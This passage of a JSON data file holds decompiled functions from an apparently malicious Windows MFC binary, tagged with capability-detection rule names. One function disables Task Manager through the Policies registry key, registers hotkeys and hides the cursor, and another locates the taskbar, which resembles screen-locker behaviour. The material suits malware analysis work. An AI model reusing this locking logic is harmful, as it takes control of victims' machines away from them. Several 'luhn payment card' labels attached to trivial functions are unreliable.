        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.0043272b(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint hWnd;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    extraout_ECX[1] = NULL;\n    extraout_ECX[2] = NULL;\n    extraout_ECX[3] = NULL;\n    *(unaff_EBP + -4) = 0;\n    iVar3 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CPaintDC.0;\n    pcVar1 = *(iVar3 + 0x1c);\n    extraout_ECX[4] = pcVar1;\n    uVar2 = (*_sym.imp.USER32.dll_BeginPaint)(pcVar1, extraout_ECX + 5);\n    iVar3 = fcn.00432570(uVar2);\n    if (iVar3 == 0) {\n        fcn.0043212c();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 338
    },
    "004377c6": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.004377c6(code **param_1)\n\n{\n    param_1[5] = NULL;\n    param_1[2] = NULL;\n    param_1[3] = NULL;\n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    fcn.00436f9c();\n    return param_1;\n}\n",
        "token_count": 146
    },
    "00439dc6": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00439dc6(code **param_1, code *param_2, code *param_3, code *param_4, code *param_5)\n\n{\n    fcn.0042f302();\n    *param_1 = vtable.CEnumArray.0;\n    param_1[0xd] = vtable.CEnumArray::XEnumVOID.0;\n    param_1[8] = NULL;\n    param_1[10] = NULL;\n    param_1[7] = param_2;\n    param_1[0xb] = param_4;\n    param_1[9] = param_3;\n    param_1[0xc] = param_5;\n    return param_1;\n}\n",
        "token_count": 165
    },
    "00401c40": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401c40(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x14) = param_2;\n    if (0xf < *(param_1 + 0x18)) {\n        *(*(param_1 + 4) + param_2) = 0;\n        return;\n    }\n    *(param_1 + 4 + param_2) = 0;\n    return;\n}\n",
        "token_count": 105
    },
    "00401ef0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00401ef0(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    if (*(param_1 + 0x14) < param_2) {\n        fcn.00427217();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        puVar1 = puVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            puVar1 = *puVar5;\n        }\n        fcn.00418360(puVar4 + param_2, puVar1 + param_3 + param_2, uVar2 - param_3);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(puVar5 + iVar3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 345
    },
    "00402410": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402410(int32_t param_1)\n\n{\n    if (0xf < *(param_1 + 0x18)) {\n        fcn.0042f834(*(param_1 + 4));\n    }\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    return;\n}\n",
        "token_count": 101
    },
    "00407250": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00407250(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 0x14) = 0;\n    *(param_1 + 4) = 0;\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00402bb0(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 161
    },
    "0040d420": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d420(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    code *pcStack124;\n    char *pcStack120;\n    uint uStack116;\n    char *pcStack112;\n    uint uStack104;\n    uchar *puStack100;\n    uint uStack96;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack12 = *in_FS_OFFSET;\n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b550;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    fcn.0042ec5b();\n    (*_sym.imp.USER32.dll_RegisterHotKey)();\n    (*_sym.imp.USER32.dll_SystemParametersInfoA)();\n    uStack96 = 0x40d48b;\n    fcn.0042ee21(0x4501c8, 0, 0, 0, 0, 3);\n    uStack96 = 0x40d492;\n    fcn.00402370();\n    uStack96 = 5;\n    puStack100 = 0x40d49b;\n    fcn.0042ecd5();\n    puStack100 = NULL;\n    uStack104 = 0x40d4a3;\n    (*_sym.imp.USER32.dll_ShowCursor)();\n    uStack104 = 1;\n    pcStack112 = \"DisableTaskMgr\";\n    uStack116 = 0x40d4b6;\n    fcn.0040cde0();\n    pcStack120 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\";\n    pcStack124 = 0x40d4cf;\n    fcn.0040cde0();\n    pcStack124 = reloc.OLEAUT32.dll_SysReAllocString;\n    fcn.0040d690();\n    pcStack112 = 0x1;\n    pcStack120 = \"DisableTaskMgr\";\n    pcStack124 = 0x40d4f7;\n    fcn.0040cde0();\n    puStack100 = &stack0xffffff84;\n    fcn.0040cde0(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\");\n    fcn.0040d690(0x80000001);\n    pcStack120 = 0x40d52a;\n    iVar2 = fcn.00438818();\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    pcStack124 = *(iVar2 + 0xc);\n    pcStack120 = 0x88;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x41c), 0x464);\n    (*pcVar1)(*(param_1 + 0x41c), 0x465, 0xffffffff, 0xffff0000);\n    iVar2 = fcn.00438818();\n    (*pcVar1)(*(param_1 + 0x3cc), 0x464, *(iVar2 + 0xc), 0x89);\n    (*pcVar1)(*(param_1 + 0x3cc), 0x465, 0xffffffff, 0xffff0000);\n    iVar2 = fcn.00438818();\n    uVar3 = 0x464;\n    (*pcVar1)(*(param_1 + 0x37c), 0x464, *(iVar2 + 0xc), 0x8a);\n    (*pcVar1)(*(param_1 + 0x37c), 0x465, 0xffffffff, 0xffff0000);\n    fcn.0042ed32();\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 833
    },
    "00412abf": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00412abf(uint *param_1, uint param_2, uint param_3, ushort param_4)\n\n{\n    *param_1 = 0;\n    *(param_1 + 1) = param_4;\n    param_1[3] = 0;\n    param_1[5] = 0;\n    param_1[2] = param_3;\n    param_1[6] = param_2;\n    return;\n}\n",
        "token_count": 107
    },
    "0042fc82": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.0042fc82(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = *(param_1 + 4);\n    if ((iVar1 == 0x200) || (iVar1 == 0xa0)) {\n        iVar1 = fcn.00438808();\n        iVar2 = fcn.0040f273(*(param_1 + 0x14), *(param_1 + 0x18));\n        if ((iVar2 == 0) || (*(param_1 + 4) != *(iVar1 + 0x54))) {\n            *(iVar1 + 0x4c) = *(param_1 + 0x14);\n            *(iVar1 + 0x50) = *(param_1 + 0x18);\n            *(iVar1 + 0x54) = *(param_1 + 4);\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        return uVar3;\n    }\n    if ((iVar1 != 0xf) && (iVar1 != 0x118)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 270
    },
    "00430f07": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.00430f07(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code *pcVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    pcVar1 = *(unaff_EBP + 8);\n    *extraout_ECX = vtable.CHandleMap.0;\n    uVar2 = *(pcVar1 + 4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00417bc5(uVar2, 0x40);\n    *(unaff_EBP + -4) = 0;\n    fcn.0042a77e(10);\n    *(unaff_EBP + -4) = 1;\n    fcn.0042a77e(4);\n    *(unaff_EBP + -4) = 2;\n    fcn.0042a5c2(7, 0);\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[5] = *(unaff_EBP + 0xc);\n    extraout_ECX[6] = *(unaff_EBP + 0x10);\n    extraout_ECX[0x16] = *(unaff_EBP + 0x14);\n    pcVar3 = *(unaff_EBP + 0x18);\n    extraout_ECX[0x15] = pcVar1;\n    extraout_ECX[0x17] = pcVar3;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 458
    },
    "00433fd3": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\ncode ** __cdecl fcn.00433fd3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code **extraout_ECX;\n    code *extraout_ECX_00;\n    code *pcVar3;\n    code *extraout_EDX;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.0043149b();\n    pcVar4 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    pcVar3 = *(unaff_EBP + 0xc);\n    *extraout_ECX = vtable.CMemFile.0;\n    if ((pcVar4 == NULL) && (pcVar3 != NULL)) {\n        fcn.00429be4();\n        pcVar3 = extraout_ECX_00;\n        pcVar4 = extraout_EDX;\n    }\n    pcVar1 = *(unaff_EBP + 0x10);\n    extraout_ECX[5] = NULL;\n    extraout_ECX[4] = pcVar1;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[6] = pcVar3;\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[7] = ~-(pcVar1 != NULL) & pcVar3;\n    extraout_ECX[8] = pcVar4;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 410
    },
    "00434245": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00434245(int32_t *param_1)\n\n{\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    if ((param_1[8] != 0) && (param_1[9] != 0)) {\n        (**(*param_1 + 0x60))(param_1[8]);\n    }\n    param_1[8] = 0;\n    return;\n}\n",
        "token_count": 124
    },
    "0043433e": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043433e(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CMemFile.0;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.00434245();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    fcn.004314da();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 253
    },
    "004386ff": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004386ff(code **param_1, uchar param_2)\n\n{\n    *param_1 = vtable.AFX_MODULE_STATE.0;\n    param_1[7] = NULL;\n    param_1[8] = NULL;\n    param_1[9] = NULL;\n    param_1[10] = NULL;\n    param_1[0x40f] = NULL;\n    param_1[0x410] = NULL;\n    param_1[0x413] = 0xffffffff;\n    param_1[0x414] = NULL;\n    param_1[0x419] = NULL;\n    param_1[0x41a] = NULL;\n    param_1[10] = 0x1c;\n    param_1[8] = 0x14;\n    param_1[6] = NULL;\n    *(param_1 + 5) = param_2;\n    param_1[0xc] = 0x1;\n    param_1[0x410] = 0x18;\n    return;\n}\n",
        "token_count": 238
    },
    "00438c95": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438c95(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_ECX;\n    uint lpCriticalSection;\n    \n    puVar1 = in_ECX + 7;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    if ((arg_8h < 1) || (in_ECX[3] <= arg_8h)) goto code_r0x00438d8f;\n    iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*in_ECX);\n    if (iVar2 == 0) {\n        iVar2 = fcn.00438981(0x10);\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.00438be7();\n        }\n        *(iVar2 + 8) = 0;\n        *(iVar2 + 0xc) = 0;\n        *(iVar2 + in_ECX[6]) = in_ECX[5];\n        in_ECX[5] = iVar2;\ncode_r0x00438d10:\n        if (*(iVar2 + 0xc) == 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, in_ECX[3] << 2);\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LocalReAlloc)(*(iVar2 + 0xc), in_ECX[3] << 2, 2);\n        }\n        if (iVar3 == 0) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n            iVar3 = fcn.00429bb0();\n        }\n        *(iVar2 + 0xc) = iVar3;\n        fcn.004192e0(iVar3 + *(iVar2 + 8) * 4, 0, (in_ECX[3] - *(iVar2 + 8)) * 4);\n        *(iVar2 + 8) = in_ECX[3];\n        (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, iVar2);\n    }\n    else if ((*(iVar2 + 8) <= arg_8h) && (arg_ch != 0)) goto code_r0x00438d10;\n    if ((*(iVar2 + 0xc) != 0) && (arg_8h < *(iVar2 + 8))) {\n        *(*(iVar2 + 0xc) + arg_8h * 4) = arg_ch;\n    }\ncode_r0x00438d8f:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return;\n}\n",
        "token_count": 611
    },
    "0043a7c7": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a7c7(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.COleDispatchException.0;\n    fcn.004014f0();\n    fcn.004014f0();\n    ppiVar3 = param_1[3] + -0x10;\n    piVar1 = param_1[3] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "00401150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401150(int32_t param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43b238;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 0;\n    *(param_1 + 0x70) = vtable.CGdiObject.0;\n    fcn.004328ae();\n    uStack4 = 0xffffffff;\n    fcn.0042aade();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 145
    },
    "00437e27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00437e27(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWinApp.0;\n    piVar1 = extraout_ECX[0x15];\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))(1);\n    }\n    if (extraout_ECX[0x21] != NULL) {\n        (**(*extraout_ECX[0x21] + 0x18))(1);\n    }\n    iVar3 = fcn.00438818();\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*0x450274 != NULL) {\n            (**(**0x450274 + 4))(1);\n            *0x450274 = NULL;\n        }\n        if (*0x450270 != NULL) {\n            (**(**0x450270 + 4))(1);\n            *0x450270 = NULL;\n        }\n    }\n    if (extraout_ECX[0x1b] != NULL) {\n        fcn.00433666(extraout_ECX[0x1b]);\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        fcn.00433666(extraout_ECX[0x1c]);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    if (*(extraout_ECX + 0x23) != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(*(extraout_ECX + 0x23));\n    }\n    if (*(extraout_ECX + 0x8e) != 0) {\n        (*pcVar2)(*(extraout_ECX + 0x8e));\n    }\n    if (extraout_ECX[0x22] != NULL) {\n        (**(*extraout_ECX[0x22] + 4))(1);\n    }\n    iVar3 = fcn.00438818();\n    if (*(iVar3 + 0x10) == extraout_ECX[0x13]) {\n        *(iVar3 + 0x10) = 0;\n    }\n    if (*(iVar3 + 4) == extraout_ECX) {\n        *(iVar3 + 4) = 0;\n    }\n    fcn.00418911(extraout_ECX[0x13]);\n    fcn.00418911(extraout_ECX[0x14]);\n    fcn.00418911(extraout_ECX[0x17]);\n    fcn.00418911(extraout_ECX[0x18]);\n    fcn.00418911(extraout_ECX[0x19]);\n    *(unaff_EBP + -4) = 0xffffffff;\n    extraout_ECX[10] = NULL;\n    fcn.0043b093();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 776
    },
    "00401300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401300(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43b288;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    uStack4 = 0;\n    fcn.00436cdb();\n    uStack4 = 0xffffffff;\n    fcn.0042aade();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 118
    },
    "00401450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00401450(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uint32_t unaff_EDI;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(param_1, param_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    puVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    if (puVar2 != NULL) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_SizeofResource)(param_1, param_2);\n        puVar3 = iVar1 + puVar2;\n        for (unaff_EDI = unaff_EDI & 0xf; unaff_EDI != 0; unaff_EDI = unaff_EDI - 1) {\n            if (puVar3 <= puVar2) {\n                return 0;\n            }\n            puVar2 = puVar2 + *puVar2 + 1;\n        }\n        if (puVar2 < puVar3) {\n            return -(*puVar2 != 0) & puVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 277
    },
    "004014b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004014b0(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_1, (param_2 >> 4) + 1 & 0xffff, 6);\n    if (iVar1 == 0) {\n        return;\n    }\n    fcn.00401450(param_1, iVar1, param_2);\n    return;\n}\n",
        "token_count": 106
    },
    "00401c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00401c60(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 76
    },
    "00401c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401c80(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    \n    iVar4 = *param_1;\n    ppiVar1 = iVar4 + -0x10;\n    piVar3 = *ppiVar1;\n    if (*(iVar4 + -0xc) != 0) {\n        piVar2 = iVar4 + -4;\n        if (*(iVar4 + -4) < 0) {\n            if (*(iVar4 + -8) < 0) {\n                fcn.00401430(0x80070057);\n                iVar4 = extraout_ECX;\n            }\n            *(iVar4 + -0xc) = 0;\n            **param_1 = 0;\n            return;\n        }\n        LOCK();\n        iVar4 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar4 == 1 || iVar4 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1);\n        }\n        iVar4 = (**(*piVar3 + 0xc))();\n        *param_1 = iVar4 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "00401e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t ** __thiscall fcn.00401e60(int32_t **param_1, int32_t *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b428;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = param_2;\n    if (*(*(*param_2 + 4) + 0x28 + param_2) != 0) {\n        fcn.00427142();\n    }\n    uStack4 = 0;\n    if ((*(*(*param_2 + 4) + 8 + param_2) == 0) && (*(param_2 + *(*param_2 + 4) + 0x2c) != 0)) {\n        fcn.00401da0();\n    }\n    *(param_1 + 1) = *(*(*param_2 + 4) + 8 + param_2) == 0;\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 264
    },
    "004020b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004020b0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.004308e7();\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    return param_1;\n}\n",
        "token_count": 89
    },
    "00402280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402280(uint *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x43b3f2;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    *param_1 = 0x43db40;\n    uStack4 = 8;\n    fcn.0040d600();\n    uStack4._0_1_ = 7;\n    fcn.00436cdb();\n    uStack4._0_1_ = 6;\n    fcn.00429c97();\n    uStack4._0_1_ = 5;\n    fcn.00429c97();\n    uStack4._0_1_ = 4;\n    fcn.00429c97();\n    uStack4._0_1_ = 3;\n    fcn.0040e160();\n    ppiVar3 = param_1[0x39] + -0x10;\n    uStack4._0_1_ = 2;\n    piVar1 = param_1[0x39] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    uStack4._0_1_ = 1;\n    fcn.00429e34();\n    uStack4 = uStack4._1_3_ << 8;\n    param_1[0x1c] = vtable.CGdiObject.0;\n    fcn.004328ae();\n    uStack4 = 0xffffffff;\n    fcn.0042aade();\n    *in_FS_OFFSET = uStack12;\n    return;\n}\n",
        "token_count": 461
    },
    "00402370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402370(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x43b408;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piVar2 = fcn.004308e7();\n    ppiVar3 = (**(*piVar2 + 0xc))();\n    uVar5 = 0;\n    uStack4 = 0;\n    uVar4 = (*_sym.imp.USER32.dll_FindWindowExA)(0, 0, \"Shell_TrayWnd\", 0);\n    *0x44e744 = fcn.0042cb01(uVar4);\n    *0x44e774 = *0x44e744;\n    fcn.0042ed11(0);\n    ppiVar1 = ppiVar3 + 3;\n    LOCK();\n    piVar2 = *ppiVar1;\n    *ppiVar1 = *ppiVar1 + -1;\n    if (piVar2 == 0x1 || piVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    *in_FS_OFFSET = uVar5;\n    return;\n}\n",
        "token_count": 334
    },
    "00402440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
